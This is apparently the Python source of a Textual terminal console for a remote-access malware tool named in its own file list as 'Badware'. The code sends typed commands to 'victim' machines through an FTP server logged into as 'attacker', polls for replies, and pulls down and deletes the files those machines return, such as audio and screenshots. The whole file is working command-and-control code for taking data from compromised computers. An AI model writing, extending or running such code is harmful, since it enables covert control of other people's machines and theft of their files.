import contextlib
from datetime import datetime
from colorama import Fore
from textual.app import App, ComposeResult
from textual.widgets import Header, Footer, Input, Button
from textual.containers import Container, Horizontal
from ftplib import FTP
import time
import threading
class mainscr(App):
    """Main UI to use modules"""
    CSS_PATH = "dom4.css"
    BINDINGS = [("ctrl+d", "toggle_dark", "Toggle dark mode"), ("ctrl+c", "exi", "Exit")]

    def compose(self) -> ComposeResult:
        """Create child widgets for the app."""
        yield Header()
        yield Footer()
        yield Container(
            Input(placeholder="Enter Command...", classes="question"),
            Horizontal(
                Button("Send", variant="success", id="snd"),
                Button("Status will appear here", variant="default", disabled=True, id="sta"),
                classes="buttons",
            ),
            id="dialog",
        )
    def on_button_pressed(self, event: Button.Pressed) -> None:
        if event.button.id == "snd":
            text = self.query_one(".question").value
            self.query_one(".question").value = ""
            status =  self.query_one("#sta")
            status.label = "sending..."
            status.variant = "warning"
            with open("server", "r") as f:
                server = FTP(f.read(),'attacker','attackerpass1234')
            with contextlib.suppress(Exception):
                __import__("os").remove("i.instruction")
            with open("i.instruction", "x") as f:
                f.write(text)
            with open("i.instruction", "rb") as f:
                server.storbinary('STOR i.instruction', f)
            __import__("os").remove("i.instruction")
            status.label = "awaiting response..."
            t1 = threading.Thread(target=check, args=(status, server,))
            t1.start()
            t2 = threading.Thread(target=procc, args=(status, server,))
            t2.start()
        else:
            with open('end', "w") as f:
                f.write("True")

    def action_toggle_dark(self) -> None:
        """An action to toggle dark mode."""
        self.dark = not self.dark
    def action_exi(self) -> None:
        print(
        f'{Fore.YELLOW}[{datetime.now().strftime("%H:%M:%S")}] Exiting...{Fore.RESET}'
        )
        time.sleep(0.2)
        self.exit()
def procc(status, server):
    i = 0
    timeout = 2
    while i<timeout:
        time.sleep(1)
        if open("proc", "r").read() == "True":
            t3 = threading.Thread(target=check2, args=(status, server,))
            t3.start()
            break
def check(status, server):
    timeout = 2
    i = 0
    while True:
        time.sleep(1)
        if "done" in server.nlst():
            res = True
            break
        elif i > timeout:
            res = False
            break
        i += 1
    status.label = "awaiting response..."
    if res:
        status.label = "Victim response recieved, waiting for return data... (Click this button to stop waiting)"
        status.disabled = False
        status.variant = "success"
        with open('proc', "w") as f:
            f.write("True")
    else:
        status.label = "Timeout: no response from victim"
        server.delete("i.instruction")
        status.variant = "error"
def check2(status, server):
    server.delete("i.instruction")
    server.delete("done")
    with contextlib.suppress(Exception):
        server.delete("wallpaper.png")
    with contextlib.suppress(Exception):
        server.delete("sentaud")
    while True:
        time.sleep(1)
        if len(server.nlst()) > 2:
            res = True
            break
        elif open("end", "r").read() == "True":
            res = False
            break
    status.disabled = True
    if res:
        status.variant = "warning"
        status.label = "Victim returned data, retriving data and cleaning server..."
        files = server.nlst()
        for file in files:
            if file not in ["Badware.zip", "py.zip"]:
                server.retrbinary(f'RETR {file}', open(fr"./received/{file}", "wb").write)
                server.delete(file)
        status.variant = "success"
    else:
        status.variant = "warning"
    status.label = "Done!"
    with open('proc', "w") as f:
        f.write("False")
    with open('end', "w") as f:
            f.write("False")
if __name__ == "__main__":
    app = mainscr()
    app.run()